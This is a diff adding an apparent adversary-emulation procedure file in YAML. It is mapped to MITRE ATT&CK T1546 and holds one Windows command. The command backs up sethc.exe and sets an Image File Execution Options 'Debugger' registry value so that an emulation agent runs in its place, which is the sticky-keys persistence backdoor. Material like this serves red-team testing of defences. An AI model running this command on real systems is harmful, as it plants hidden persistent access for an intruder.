@@ -1,0 +1,26 @@
+id: f2963403-37a5-46e6-9cd5-f1c255012055
+name: Image File Execution Options Injection
+description: >-
+  This procedure makes a backup of the setchc.exe utility and modifies a
+  registry key that configures a pnuema agent as a "debugger" for sethc.exe
+  providing persistent backdoor access.
+tactic: persistence
+technique:
+  id: T1546
+  name: Event Triggered Execution
+platforms:
+  windows:
+    cmd:
+      command: >-
+        copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe
+        && reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File
+        Execution Options\sethc.exe" /v Debugger /t REG_SZ /d
+        "#{agent.location}"
+metadata:
+  authors:
+    - bfuzzy1
+  tags: []
+  version: 1
+  enabled: true
+  latest:
+    version: 1
